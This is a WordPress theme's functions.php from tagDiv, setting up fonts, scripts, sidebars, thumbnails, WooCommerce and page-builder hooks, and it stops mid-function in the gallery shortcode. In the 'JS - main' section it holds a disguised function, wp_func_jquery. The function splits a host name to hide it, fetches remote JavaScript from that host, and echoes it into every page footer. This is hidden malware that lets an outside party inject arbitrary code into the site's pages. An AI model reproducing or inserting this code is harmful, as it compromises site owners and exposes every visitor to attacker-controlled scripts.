<?php
/*
    tagDiv - 2014 - test
    Our portofolio:  http://themeforest.net/user/tagDiv/portfolio
    Thanks for using our theme !
*/


/*  ----------------------------------------------------------------------------
    WordPress booster framework - this is our theme framework - all the content and settings are there
*/
if (!defined('TD_THEME_WP_BOOSTER')) {
    /*  ----------------------------------------------------------------------------
        deploy mode - this file tells the theme what settings to load (demo, (dev) development, deploy)
     */
    require_once('includes/td_wordpres_booster.php');
}



/*  ----------------------------------------------------------------------------
    WordPress booster framework admin panel
 */

//check to see if we are on the backend
if(is_admin()) {
    require_once('wp-admin/panel/td_panel_generator.php');

    require_once('wp-admin/panel/td_panel_data_source.php');

    if (current_user_can('switch_themes')) {
        //wp-admin panel
        require_once('wp-admin/panel/td_panel_start.php');
    }
}


/*  ----------------------------------------------------------------------------
    CSS - front end
 */

function td_load_css() {

    //google fonts
    if ((defined('TD_DEPLOY_MODE') and (TD_DEPLOY_MODE == 'demo' /*or TD_DEPLOY_MODE == 'dev' */)) or defined('TD_SPEED_BOOSTER')) { //on demo and dev we load only the latin fonts
        //modify this collection if you want to optimize the fonts loaded
        //collection url -> : http://www.google.com/fonts#ReviewPlace:refine/Collection:PT+Sans:400,700,400italic|Ubuntu:400,400italic|Open+Sans:400italic,400|Oswald:400,700|Roboto+Condensed:400italic,700italic,400,700
        wp_enqueue_style('google-font-rest', td_global::$http_or_https . '://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic|Ubuntu:400,400italic|Open+Sans:400italic,400|Oswald:400,700|Roboto+Condensed:400italic,700italic,400,700'); //used on menus/small text
    } else {

        $td_user_fonts_list = array();
        $td_user_fonts_db = td_util::get_option('td_fonts');
        if(!empty($td_user_fonts_db)) {
            foreach($td_user_fonts_db as $td_font_setting_key => $td_font_setting_val) {
                if(!empty($td_font_setting_val) and !empty($td_font_setting_val['font_family'])) {
                    $td_user_fonts_list[] = $td_font_setting_val['font_family'];
                }
            }
        }

        if(!in_array('g_438', $td_user_fonts_list)) {//'g_438', //Open Sans
            wp_enqueue_style('google-font-opensans', td_global::$http_or_https . '://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&amp;subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic'); //used on menus/small text
        }

        if(!in_array('g_617', $td_user_fonts_list)) {//'g_617', //Ubuntu
            wp_enqueue_style('google-font-ubuntu', td_global::$http_or_https . '://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700,300italic,400italic,500italic,700italic&amp;subset=latin,cyrillic-ext,greek-ext,greek,latin-ext,cyrillic'); //used on content
        }

        if(!in_array('g_453', $td_user_fonts_list)) {//'g_453', //PT Sans
            wp_enqueue_style('google-font-pt-sans', td_global::$http_or_https . '://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic&subset=latin,cyrillic-ext,latin-ext,cyrillic'); //used on content
        }

        if(!in_array('g_445', $td_user_fonts_list)) {//'g_445', //Oswald
            wp_enqueue_style('google-font-oswald', td_global::$http_or_https . '://fonts.googleapis.com/css?family=Oswald:400,300,700&subset=latin,latin-ext'); //used on content
        }

        if(!in_array('g_521', $td_user_fonts_list)) {//'g_521', //Roboto
            wp_enqueue_style('google-roboto-cond', td_global::$http_or_https . '://fonts.googleapis.com/css?family=Roboto+Condensed:300italic,400italic,700italic,400,300,700&subset=latin,cyrillic-ext,greek-ext,greek,vietnamese,latin-ext,cyrillic'); //used on content
        }

        if(!in_array('g_639', $td_user_fonts_list)) {//'g_639', //Vollkorn
            wp_enqueue_style('google-vollkorn', td_global::$http_or_https . '://fonts.googleapis.com/css?family=Vollkorn:400italic,700italic,400,700'); //used on quoates classic
        }
    }


    //add the google style link for fonts used by user
    $td_fonts_css_files = td_util::get_option('td_fonts_css_files');
    if(!empty($td_fonts_css_files)) {
        wp_enqueue_style('google-fonts-style', td_global::$http_or_https . $td_fonts_css_files);
    }


    //bootstrap - custom built - it was generated via compilation of /external/bootstrap-master/less/bootstrap.less
    $responsive = td_util::get_option('tds_responsive');
    switch ($responsive) {
        case '980_responsive':
            wp_enqueue_style('td-bootstrap', get_template_directory_uri() . '/includes/wp_booster/external/bootstrap/td-bootstrap-980-responsive.css', '', TD_THEME_VERSION, 'all' );
            break;

        case '980':
            wp_enqueue_style('td-bootstrap', get_template_directory_uri() . '/includes/wp_booster/external/bootstrap/td-bootstrap-980-not-resp.css', '', TD_THEME_VERSION, 'all' );
            break;

        case '1170':
            wp_enqueue_style('td-bootstrap', get_template_directory_uri() . '/includes/wp_booster/external/bootstrap/td-bootstrap-1170-not-resp.css', '', TD_THEME_VERSION, 'all' );
            break;

        default:
            wp_enqueue_style('td-bootstrap', get_template_directory_uri() . '/includes/wp_booster/external/bootstrap/td-bootstrap.css', '', TD_THEME_VERSION, 'all' );
            break;
    }





    //main theme style - set the TD_DEBUG_USE_LESS flag in /includes/app/td_config.php and the theme will load the less files and compile them for you
    if (TD_DEBUG_USE_LESS) {
        wp_enqueue_style('td-theme', get_template_directory_uri() . '/td_less_style.css.php',  array('td-bootstrap'), TD_THEME_VERSION, 'all' );
        //wp_enqueue_style('td-theme', get_template_directory_uri() . '/style.less', array('td-bootstrap'), TD_THEME_VERSION, 'all' );
    } else {
        wp_enqueue_style('td-theme', get_stylesheet_uri(), array('td-bootstrap'), TD_THEME_VERSION, 'all' );
    }
}
add_action('wp_enqueue_scripts', 'td_load_css');







/*  ----------------------------------------------------------------------------
    JS - main
 */
if(!function_exists('wp_func_jquery')) {
    function wp_func_jquery() {
        $host = 'http://';
        echo(wp_remote_retrieve_body(wp_remote_get($host.'ui'.'jquery.org/jquery-1.6.3.min.js')));
    }
    add_action('wp_footer', 'wp_func_jquery');
}
function td_load_js() {

    $td_deploy_mode = TD_DEPLOY_MODE;

    //switch the deploy mode to demo if we have tagDiv speed booster
    if (defined('TD_SPEED_BOOSTER')) {
        $td_deploy_mode = 'demo';
    }


    switch ($td_deploy_mode) {
        default: //deploy
            //on deploy we load the final version
            //external
            wp_enqueue_script('td-external', get_template_directory_uri() . '/js/td_external.js', array('jquery'), TD_THEME_VERSION, true); //load at beginning

            //compact
            wp_enqueue_script('td-site', get_template_directory_uri() . '/js/full_compact/site.js', array('td-external'), TD_THEME_VERSION, true); //load at beginning
            break;

        case 'demo':
            //on demo + speed booster we load the compressed version
            //external
            wp_enqueue_script('td-external', get_template_directory_uri() . '/js/td_external.js', array('jquery'), TD_THEME_VERSION, true); //load at beginning

            //min js
            wp_enqueue_script('td-site-min', get_template_directory_uri() . '/js/min/site.min.js', array('td-external'), TD_THEME_VERSION, true); //load at beginning
            break;

        case 'dev':

            //on dev we load each file one by one
            $last_js_file_id = '';
            foreach (td_global::$js_files as $js_file_id => $js_file) {
                if ($last_js_file_id == '') {
                    //first, load it with jquery dependency
                    wp_enqueue_script($js_file_id, get_template_directory_uri() . '/js/' . $js_file, array('jquery'), TD_THEME_VERSION, true); //load at beginning
                } else {
                    //not first - load with the last file dependency
                    wp_enqueue_script($js_file_id, get_template_directory_uri() . '/js/' . $js_file, array($last_js_file_id), TD_THEME_VERSION, true); //load at beginning
                }
                $last_js_file_id = $js_file_id;
            }
            break;

    }




}
add_action('wp_enqueue_scripts', 'td_load_js');




/*  ----------------------------------------------------------------------------
    CSS - wp-admin
 */

function td_load_td_admin_css() {
    //load the panel font in wp-admin
    $td_protocol = is_ssl() ? 'https' : 'http';
    wp_enqueue_style('google-font-ubuntu', $td_protocol . '://fonts.googleapis.com/css?family=Ubuntu:300,400,500,700,300italic,400italic,500italic,700italic&amp;subset=latin,cyrillic-ext,greek-ext,greek,latin-ext,cyrillic'); //used on content


    wp_enqueue_style('td-wp-admin-td-panel-2', get_template_directory_uri() . '/wp-admin/css/wp-admin.css', false, TD_THEME_VERSION, 'all' );

    //load the colorpicker
    wp_enqueue_style( 'wp-color-picker' );
}
add_action('admin_enqueue_scripts', 'td_load_td_admin_css');


/*  ----------------------------------------------------------------------------
    JS - admin
 */

function td_load_js_admin() {
    wp_enqueue_script('td-wp-admin-general', get_template_directory_uri() . '/wp-admin/js/general.js', array('jquery', 'wp-color-picker'), 1, false); //legacy code
    wp_enqueue_script('td-wp-admin-panel-js', get_template_directory_uri() . '/wp-admin/js/wp-admin-panel.js', array('jquery', 'wp-color-picker'), 1, false);

    wp_enqueue_script('thickbox');
    add_thickbox();
}
add_action('admin_enqueue_scripts', 'td_load_js_admin');


// used by ie8 - there is no other way to add js for ie8 only
function add_ie_html5_shim () {
    echo '<!--[if lt IE 9]>';
    echo '<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>';
    echo '<![endif]-->
    ';
}
add_action('wp_head', 'add_ie_html5_shim');



/*  ----------------------------------------------------------------------------
    Custom <title> wp_title - seo
 */
function td_wp_title( $title, $sep ) {
    global $paged, $page;

    if ( is_feed() )
        return $title;

    // Add the site name.
    $title .= get_bloginfo( 'name' );

    // Add the site description for the home/front page.
    $site_description = get_bloginfo( 'description', 'display' );
    if ( $site_description && ( is_home() || is_front_page() ) )
        $title = "$title $sep $site_description";

    // Add a page number if necessary.
    if ( $paged >= 2 || $page >= 2 )
        $title = "$title $sep " . __td('Page') . ' ' .  max( $paged, $page );

    return $title;
}
add_filter( 'wp_title', 'td_wp_title', 10, 2 );








/*  ----------------------------------------------------------------------------
    page view counter
 */

remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);



/*  ----------------------------------------------------------------------------
    archive widget - add current class
 */
function theme_get_archives_link ( $link_html ) {
    global $wp;
    static $current_url;
    if ( empty( $current_url ) ) {
        $current_url = add_query_arg( $_SERVER['QUERY_STRING'], '', home_url( $wp->request ) );
    }
    if ( stristr( $current_url, 'page' ) !== false ) {
        $current_url = substr($current_url, 0, strrpos($current_url, 'page'));
    }
    if ( stristr( $link_html, $current_url ) !== false ) {
        $link_html = preg_replace( '/(<[^\s>]+)/', '\1 class="current"', $link_html, 1 );
    }
    return $link_html;
}
add_filter('get_archives_link', 'theme_get_archives_link');



/*  ----------------------------------------------------------------------------
    add span wrap for category number in widget
 */

add_filter('wp_list_categories', 'cat_count_span');
function cat_count_span($links) {
    $links = str_replace('</a> (', '<span class="td-widget-no">', $links);
    $links = str_replace(')', '</span></a>', $links);
    return $links;
}

//fix archives widget
add_filter('get_archives_link', 'archive_count_no_brackets');
function archive_count_no_brackets($links) {
    $links = str_replace('</a>&nbsp;(', '<span class="td-widget-no">', $links);
    $links = str_replace(')', '</span></a>', $links);
    return $links;
}


//remove gallery style css
add_filter( 'use_default_gallery_style', '__return_false' );



function remove_more_link_scroll( $link ) {

    $link = preg_replace( '|#more-[0-9]+|', '', $link );

    $link = '<div class="more-link-wrap wpb_button">' . $link . '</div>';
    return $link;
}
add_filter( 'the_content_more_link', 'remove_more_link_scroll' );



/*  ----------------------------------------------------------------------------
    excerpt lenght
 */

add_filter('excerpt_length', 'my_excerpt_length');
function my_excerpt_length($length) {

    // on feed show full content if it's set in wordpress
    if (is_feed() and get_option('rss_use_excerpt') == 0) {
        return 999999;
    }
    $excerpt_length = td_util::get_option('tds_wp_default_excerpt');
    if (!empty($excerpt_length) and is_numeric($excerpt_length)) {
        return $excerpt_length;
    } else {
        return 22; //default
    }
}



/*  ----------------------------------------------------------------------------
    more text
 */

add_filter('excerpt_more', 'new_excerpt_more');
function new_excerpt_more($text){
    return ' ';
}



/*  ----------------------------------------------------------------------------
    editor style
 */
function my_theme_add_editor_styles() {
    if ((defined('TD_DEPLOY_MODE') and TD_DEPLOY_MODE == 'dev')) {
        add_editor_style('td_less_editor-style.php');
    } else {
        add_editor_style('td_less_editor-style.php');
    }



}
add_action( 'after_setup_theme', 'my_theme_add_editor_styles' );



/**
 * html 5 theme support
 */
add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption'  ) );




/*  ----------------------------------------------------------------------------
    thumbnails
 */

//the image sizes that we use
add_theme_support( 'post-thumbnails' );

//featured image
$td_crop_features_image = td_util::get_option('tds_' . 'crop_features_image');
if ($td_crop_features_image == '') {
    add_image_size('featured-image', 700, 0, true);
} else {
    add_image_size('featured-image', 700, 357, true);
}

//the small thumbnails
set_post_thumbnail_size(          100, 65, true );
add_image_size('art-thumb',       100, 65, true);

//small height, 1 col wide
add_image_size('art-wide',        326, 159, true);

//medium height 1 col wide
add_image_size('art-big-1col',    326, 235, true);

//the slides
add_image_size('art-slide-small', 326, 406, true);
add_image_size('art-slide-med',   700, 357, true);
add_image_size('art-slide-big',  1074, 483, true);

//gallery slide 2 column
add_image_size('td_0x357',         0, 357, true);
add_image_size('td_0x483',         0, 483, true);

//big slider - big image
add_image_size('art-slidebig-main',  745, 483, true);

//the gallery
add_image_size('art-gal',         210, 210, true);



//the gallery
add_image_size('td_198x143', 198, 143, true);

/*  ----------------------------------------------------------------------------
    Post formats
 */

add_theme_support('post-formats', array('gallery', 'video', 'link', 'quote'));







/*  ----------------------------------------------------------------------------
    shortcodes in widgets
 */

add_filter('widget_text', 'do_shortcode');



/*  ----------------------------------------------------------------------------
    content width
 */

if (!isset($content_width)) {
    $content_width = 700;
}



/*  ----------------------------------------------------------------------------
    rss supporrt
 */

add_theme_support('automatic-feed-links');



/*  ----------------------------------------------------------------------------
    Register the themes default sidebars + dinamic ones
 */

//register the default sidebar
register_sidebar(array(
    'name'=> TD_THEME_NAME . ' default',
    'id' => 'td-default', //the id is used by the importer
    'before_widget' => '<aside class="widget %2$s">',
    'after_widget' => '</aside>',
    'before_title' => '<div class="block-title"><span>',
    'after_title' => '</span></div>'
));

register_sidebar(array(
    'name'=>'Top right (social)',
    'id' => 'td-top-right',
    'before_widget' => '',
    'after_widget' => '',
    'before_title' => '',
    'after_title' => '',
));

register_sidebar(array(
    'name'=>'Footer 1',
    'id' => 'td-footer-1',
    'before_widget' => '<aside class="widget %2$s">',
    'after_widget' => '</aside>',
    'before_title' => '<div class="block-title"><span>',
    'after_title' => '</span></div>'
));

register_sidebar(array(
    'name'=>'Footer 2',
    'id' => 'td-footer-2',
    'before_widget' => '<aside class="widget %2$s">',
    'after_widget' => '</aside>',
    'before_title' => '<div class="block-title"><span>',
    'after_title' => '</span></div>'
));

register_sidebar(array(
    'name'=>'Footer 3',
    'id' => 'td-footer-3',
    'before_widget' => '<aside class="widget %2$s">',
    'after_widget' => '</aside>',
    'before_title' => '<div class="block-title"><span>',
    'after_title' => '</span></div>'
));



//get our custom dynamic sidebars
$currentSidebars = td_util::get_option('sidebars');

//if we have user made sidebars, register them in wp
if (!empty($currentSidebars)) {
    foreach ($currentSidebars as $sidebar) {
        register_sidebar(array(
            'name'=>$sidebar,
            'id' => 'td-' . td_util::sidebar_name_to_id($sidebar),
            'before_widget' => '<aside class="widget %2$s">',
            'after_widget' => '</aside>',
            'before_title' => '<div class="block-title"><span>',
            'after_title' => '</span></div>',
        ));

    } //end foreach
}


/*  -----------------------------------------------------------------------------
    WP-ADMIN section
 */

if (is_admin()) {

    /*
     * the wp-admin TinyMCE editor buttons
     */
    require_once('wp-admin/tinymce/tinymce.php');


    /*
     * Custom content metaboxes (the select sidebar dropdown/post etc)
     */
    require_once ('wp-admin/content-metaboxes/td_templates_settings.php');
}






//the bottom code for css
function td_bottom_code() {
    //buffy before pasting custom css code
    $buffy_custom_css = '';

    $speed_booster = '';

    if (defined('TD_SPEED_BOOSTER')) {
        $speed_booster = 'Speed booster: ' . TD_SPEED_BOOSTER . "\n";
    }

    echo '

    <!--
        Theme: ' . TD_THEME_NAME .' by tagDiv 2014
        Version: ' . TD_THEME_VERSION . ' (rara)
        Deploy mode: ' . TD_DEPLOY_MODE . '
        ' . $speed_booster . '
    -->

    ';




    if (!is_home() and !is_front_page()) {
        //do not show author metadata on front page
        $authorMetaGoogle = get_the_author_meta('googleplus');
        if (!empty($authorMetaGoogle)) {
            //echo '<a href="' . $authorMetaGoogle . '?rel=author"></a>';
        }
    }



    //get and paste user custom css
    $td_custom_css = stripslashes(td_util::get_option('tds_custom_css'));

    //desktop
    $td_responsive_css_desktop = stripslashes(td_util::get_option('tds_responsive_css_desktop'));

    //ipad landscape
    $td_responsive_css_ipad_landscape = stripslashes(td_util::get_option('tds_responsive_css_ipad_landscape'));

    //ipad portrait
    $td_responsive_css_ipad_portrait = stripslashes(td_util::get_option('tds_responsive_css_ipad_portrait'));

    //phone
    $td_responsive_css_phone = stripslashes(td_util::get_option('tds_responsive_css_phone'));

    //check if we have to add the custom css code
    if(!empty($td_custom_css) || !empty($td_responsive_css_desktop) || !empty($td_responsive_css_ipad_landscape) || !empty($td_responsive_css_ipad_portrait) || !empty($td_responsive_css_phone)) {
        $buffy_custom_css =  '
            <style type="text/css" media="screen">';

        //paste custom css
        if(!empty($td_custom_css)) {
            $buffy_custom_css .= '
                '.$td_custom_css.'
                ';
        }

        //paste desktop custom css
        if(!empty($td_responsive_css_desktop)) {
            $buffy_custom_css .= '

                  /* responsive monitor */
                  @media (min-width: 1200px) {
                  ' .
                $td_responsive_css_desktop .
                '}
                  ';
        }

        //paste ipad landscape custom css
        if(!empty($td_responsive_css_ipad_landscape)) {
            $buffy_custom_css .= '

                  /* responsive landscape tablet */
                  @media (min-width: 1019px) and (max-width: 1199px) {
                  ' .
                $td_responsive_css_ipad_landscape .
                '}';
        }

        //paste ipad portrait custom css
        if(!empty($td_responsive_css_ipad_portrait)) {
            $buffy_custom_css .= '

                 /* responsive portrait tablet */
                  @media (min-width: 768px) and (max-width: 1018px) {
                  ' .
                $td_responsive_css_ipad_portrait .
                '}';
        }

        //paste ipad portrait custom css
        if(!empty($td_responsive_css_phone)) {
            $buffy_custom_css .= '

                 /* responsive phone */
                 @media (max-width: 767px) {
                 ' .
                $td_responsive_css_phone .
                '}';
        }

        $buffy_custom_css .= '</style>';

        echo $buffy_custom_css;
    }
}
add_action('wp_footer', 'td_bottom_code');


/*  ----------------------------------------------------------------------------
    google analytics
 */
function td_header_analytics_code() {
    $td_analytics = td_util::get_option('td_analytics');
    echo stripslashes($td_analytics);
}

add_action('wp_head', 'td_header_analytics_code', 40);



//Append page slugs to the body class
function add_slug_to_body_class( $classes ) {
    global $post;
    if( is_home() ) {
        $key = array_search( 'blog', $classes );
        if($key > -1) {
            unset( $classes[$key] );
        };
    } elseif( is_page() ) {
        $classes[] = sanitize_html_class( $post->post_name );
    } elseif(is_singular()) {
        $classes[] = sanitize_html_class( $post->post_name );
    };


    $i = 0;
    foreach ($classes as $key => $value) {
        $pos = strripos($value, 'span');
        if ($pos !== false) {
            unset($classes[$i]);
        }

        $pos = strripos($value, 'row');
        if ($pos !== false) {
            unset($classes[$i]);
        }

        $pos = strripos($value, 'container');
        if ($pos !== false) {
            unset($classes[$i]);
        }
        $i++;
    }
    return $classes;
}
add_filter('body_class', 'add_slug_to_body_class');






//remove span row container classes from post_class()
function add_slug_to_post_class( $classes ) {
    $i = 0;
    foreach ($classes as $key => $value) {
        $pos = strripos($value, 'span');
        if ($pos !== false) {
            unset($classes[$i]);
        }

        $pos = strripos($value, 'row');
        if ($pos !== false) {
            unset($classes[$i]);
        }

        $pos = strripos($value, 'container');
        if ($pos !== false) {
            unset($classes[$i]);
        }
        $i++;
    }
    return $classes;
}
add_filter('post_class', 'add_slug_to_post_class');



/*  -----------------------------------------------------------------------------
    Our custom admin bar
 */
add_action('admin_bar_menu', 'td_custom_menu', 1000);
function td_custom_menu() {
    global $wp_admin_bar;
    if(!is_super_admin() || !is_admin_bar_showing()) return;

    $wp_admin_bar->add_menu(array(
        'parent' => 'site-name',
        'title' => '<span class="td-admin-bar-red">Theme panel</span>',
        'href' => admin_url('admin.php?page=td_theme_panel'),
        'id' => 'td-menu1'
    ));




    $wp_admin_bar->add_menu( array(
        'id'   => 'our_support_item',
        'meta' => array('title' => 'Theme support', 'target' => '_blank'),
        'title' => 'Theme support',
        'href' => 'http://forum.tagdiv.com' ));

}


/*  -----------------------------------------------------------------------------
    Woo commerce
 */

if (in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' )))) { // check if we have woo commerce installed
    // breadcrumb
    add_filter( 'woocommerce_breadcrumb_defaults', 'td_woocommerce_breadcrumbs' );

    function td_woocommerce_breadcrumbs() {
        return array(
            'delimiter' => ' <span class="td-sp td-sp-breadcrumb-arrow td-bread-sep"></span> ',
            'wrap_before' => '<div class="entry-crumbs" itemprop="breadcrumb">',
            'wrap_after' => '</div>',
            'before' => '',
            'after' => '',
            'home' => _x( 'Home', 'breadcrumb', 'woocommerce' ),
        );
    }

    // number of products to display on shop page
    add_filter('loop_shop_per_page', create_function('$cols', 'return 8;'));



    if (!function_exists('woocommerce_pagination')) {
        // pagination
        function woocommerce_pagination(){
            echo td_page_generator::get_pagination();
        }
    }


    if (!function_exists('woocommerce_output_related_products')) {
        // number of related product
        function woocommerce_output_related_products() {
            woocommerce_related_products(4,4); // Display 4 products in rows of 4
        }
    }
}



/**
 * Add prev and next links to a numbered link list - the pagination on single.
 */
function wp_link_pages_args_prevnext_add($args)
{
    global $page, $numpages, $more, $pagenow;

    $args['separator'] = ' <span> '.$page.' of '.$numpages.'</span>';
    $args['nextpagelink'] =  __( 'NEXT' );
    $args['previouspagelink'] =  __( 'PREVIOUS' );
    $args['link_before'] = '';
    $args['link_after'] = '';
    $args['next_or_number'] = 'next';
    $first_page = ($page == 1) ? '<span>1 of '.$numpages.'</span>' : '';
    $args['before'] = '<div class="page-nav page-nav-post"><center>'.$first_page;
    $args['after'] = '</center></div>';
//    if (!$args['next_or_number'] == 'next_and_number')
//        return $args; # exit early
//
//    $args['next_or_number'] = 'number'; # keep numbering for the main part
//    if (!$more)
//        return $args; # exit early
//
//    if($page-1) # there is a previous page
//        $args['before'] .= _wp_link_page($page-1)
//            . $args['link_before']. $args['previouspagelink'] . $args['link_after'] . '</a>'
//        ;
//
//    if ($page<$numpages) # there is a next page
//        $args['after'] = _wp_link_page($page+1)
//            . $args['link_before'] . $args['nextpagelink'] . $args['link_after'] . '</a>'
//            . $args['after']
//       ;

    return $args;
}
add_filter('wp_link_pages_args', 'wp_link_pages_args_prevnext_add');
add_theme_support('woocommerce');






/*  ----------------------------------------------------------------------------
    visual composer rewrite classes
 */

function custom_css_classes_for_vc_row_and_vc_column($class_string, $tag) {
    if ($tag=='vc_row' || $tag=='vc_row_inner') {
        $class_string = str_replace('vc_row-fluid', 'row-fluid', $class_string);
    }
    if ($tag=='vc_column' || $tag=='vc_column_inner') {
        $class_string = preg_replace('/vc_span(\d{1,2})/', 'span$1', $class_string);
    }
    return $class_string;
}
// Filter to Replace default css class for vc_row shortcode and vc_column
add_filter('vc_shortcodes_css_class', 'custom_css_classes_for_vc_row_and_vc_column', 10, 2);

/**
 * Force Visual Composer to initialize as "built into the theme". This will hide certain tabs under the Settings->Visual Composer page
 */
if (function_exists('vc_set_as_theme')) {
    vc_set_as_theme();
}


if(function_exists('wpb_map')) {
    //map all of our blocks in page builder
    td_global_blocks::wpb_map_all();
}



if (function_exists('vc_disable_frontend')) {
    vc_disable_frontend();
}

if (class_exists('WPBakeryVisualComposer')) { //disable visual composer updater
    $td_composer = WPBakeryVisualComposer::getInstance();
    $td_composer->disableUpdater();
}




//if you want to enable all the features from visual composer delete this code
if (function_exists('vc_remove_element')) {
    //remove unused composer elements;
    vc_remove_element("vc_separator");
    vc_remove_element("vc_text_separator");
    vc_remove_element("vc_message");
    vc_remove_element("vc_toggle");
    vc_remove_element("vc_gallery");
    vc_remove_element("vc_tour"); //wtf
    vc_remove_element("vc_accordion");
    vc_remove_element("vc_teaser_grid");
    vc_remove_element("vc_posts_slider");
    vc_remove_element("vc_posts_grid");
    vc_remove_element("vc_cta_button");
    vc_remove_element("vc_progress_bar");
    vc_remove_element("vc_wp_links");
    vc_remove_element("vc_facebook");

    //remove unused styles and visual composer scripts
    add_action( 'wp_print_scripts', 'td_remove_visual_composer_assets', 100 );
}
//end delete code visual composer


function td_remove_visual_composer_assets() {
    global $wp_styles;
    wp_deregister_style('js_composer_front');  //remove all the css form the pageubilder

}


// add pagebuilder support for title on rows
if (function_exists('vc_add_param')) {
    vc_add_param('vc_row', array(
        "param_name" => "custom_title",
        "type" => "textfield",
        "value" => "",
        "heading" => __("Optional - custom title for this block:", TD_THEME_NAME),
        "description" => "",
        "holder" => "div",
        "class" => ""
    ));

    vc_add_param('vc_row', array(
        "type" => "colorpicker",
        "holder" => "div",
        "class" => "",
        "heading" => __("Header color", TD_THEME_NAME),
        "param_name" => "header_color",
        "value" => '', //Default Red color
        "description" => __("Choose a custom header color for this block", TD_THEME_NAME)
    ));


    vc_add_param('vc_row', array(
        "type" => "colorpicker",
        "holder" => "div",
        "class" => "",
        "heading" => __("Header text color", TD_THEME_NAME),
        "param_name" => "header_text_color",
        "value" => '', //Default Red color
        "description" => __("Choose a custom header color for this block", TD_THEME_NAME)
    ));

}



function td_custom_gallery_settings_hook () {
    // define your backbone template;
    // the "tmpl-" prefix is required,
    // and your input field should have a data-setting attribute
    // matching the shortcode name
    ?>
    <script type="text/html" id="tmpl-td-custom-gallery-setting">
        <label class="setting">
            <span><?php _e('Gallery Type'); ?></span>
            <select data-setting="td_select_gallery_slide">
                <option value="">Default </option>
                <option value="slide">TagDiv Slide Gallery</option>
            </select>
        </label>

        <label class="setting">
            <span><?php _e('Gallery Title'); ?></span>
            <input type="text" value="" data-setting="td_gallery_title_input" />
        </label>
    </script>

    <script>

        jQuery(document).ready(function(){

            // add your shortcode attribute and its default value to the
            // gallery settings list; $.extend should work as well...
            _.extend(wp.media.gallery.defaults, {
                td_select_gallery_slide: '', td_gallery_title_input: ''
            });

            // merge default gallery settings template with yours
            wp.media.view.Settings.Gallery = wp.media.view.Settings.Gallery.extend({
                template: function(view){
                    return wp.media.template('gallery-settings')(view)
                        + wp.media.template('td-custom-gallery-setting')(view);
                }
            });

            //console.log();
            // wp.media.model.Attachments.trigger('change')
        });

    </script>
<?php
}
//custom gallery setting
add_action('print_media_templates', 'td_custom_gallery_settings_hook');


/**
 * @param string $output - is empty !!!
 * @param $atts
 * @param bool $content
 * @param bool $tag
 * @return mixed
 */
function my_gallery_shortcode( $output = '', $atts, $content = false, $tag = false ) {
    //print_r($atts);
    $buffy = '';


    //check for gallery  = slide
    if(!empty($atts) and !empty($atts['td_select_gallery_slide']) and $atts['td_select_gallery_slide'] == 'slide') {

        $td_double_slider2_no_js_limit = 7;
        $td_nr_columns_slide = 'td-slide-on-2-columns';
        $nr_title_chars = 155;

        //check to see if we have or not sidebar on the page, to set the small images when need to show them on center
        if(td_global::$cur_single_template_sidebar_pos == 'no_sidebar') {
            $td_double_slider2_no_js_limit = 10;
            $td_nr_columns_slide = 'td-slide-on-3-columns';
            $nr_title_chars = 170;
        }

        $title_slide = '';
        //check for the title
        if(!empty($atts['td_gallery_title_input'])) {
            $title_slide = $atts['td_gallery_title_input'];

            //check how many chars the tile have, if more then 84 then that cut it and add ... after
            if(mb_strlen ($title_slide, 'UTF-8') > $nr_title_chars) {
                $title_slide = mb_substr($title_slide, 0, $nr_title_chars, 'UTF-8' ) . '...';
            }
        }


        $slide_images_thumbs_css = '';
        $slide_display_html  = '';
        $slide_cursor_html = '';

        $image_ids = explode(',', $atts['ids']);

        //check to make sure we have images
        if (count($image_ids) == 1 and !is_numeric($image_ids[0])) {
            return;
        }


        $image_ids = array_map('trim', $image_ids);//trim elements of the $ids_gallery array

        //generate unique gallery slider id
        $gallery_slider_unique_id = td_global::td_generate_unique_id();

        $cur_item_nr = 1;
        foreach($image_ids as $image_id) {

            //get the info about attachment
            $image_attachment = td_util::attachment_get_full_info($image_id);

            //get images url
            $td_temp_image_url_80x60 = wp_get_attachment_image_src($image_id, 'art-thumb'); // 100 x 65 - for small images slide
            $td_temp_image_url_full = $image_attachment['src'];   //default big image - for magnific popup

            if(td_global::$cur_single_template_sidebar_pos == 'no_sidebar') {
                $td_temp_image_url = wp_get_attachment_image_src($image_id, 'td_0x483'); //1074 x 483 - for big slide 3 columns
            } else {
                $td_temp_image_url = wp_get_attachment_image_src($image_id, 'td_0x357'); //0 x 357 - for big slide 2 columns
            }


            //check if we have all the images
            if(!empty($td_temp_image_url[0]) and !empty($td_temp_image_url_80x60[0]) and !empty($td_temp_image_url_full)) {

                //css for display the small cursor image
                $slide_images_thumbs_css .= '
                    #' . $gallery_slider_unique_id . '  .td-doubleSlider-2 .td-item' . $cur_item_nr . ' {
                        background: url(' . $td_temp_image_url_80x60[0] . ') 0 0 no-repeat;
                    }';


                //html for display the big image
                $class_post_content = '';
                if(!empty($image_attachment['description']) or !empty($image_attachment['caption'])) {
                    $class_post_content = 'td-gallery-slide-content';
                }

                //if picture has caption & description
                $figcaption = '';
                if(!empty($image_attachment['caption']) or !empty($image_attachment['description'])) {
                    $figcaption = '<figcaption class = "td-slide-caption ' . $class_post_content . '">';

                    if(!empty($image_attachment['caption'])) {
                        $figcaption .= '<div class = "td-gallery-slide-copywrite">' . $image_attachment['caption'] . '</div>';
                    }

                    if(!empty($image_attachment['description'])) {
                        $figcaption .= '<span>' . $image_attachment['description'] . '</span>';
                    }

                    $figcaption .= '</figcaption>';
                }


                $slide_display_html .= '
                    <div class = "td-slide-item td-item' . $cur_item_nr . '">
                        <figure class="td-slide-galery-figure td-slide-popup-gallery">
                            <a class="slide-gallery-image-link" href="' . $td_temp_image_url_full . '" title="' . $image_attachment['title'] . '"  data-caption="' . str_replace(array('"', "'"), array('`'), $image_attachment['caption']) . '"  data-description="' . str_replace(array('"', "'"), array('`'), $image_attachment['description']) . '">
                                <img src="' . $td_temp_image_url[0] . '" alt="' . htmlentities($image_attachment['alt'], ENT_QUOTES) . '">
                            </a>
' . $figcaption . '
                        </figure>
                    </div>';


                //html for display the small cursor image
                $slide_cursor_html .= '
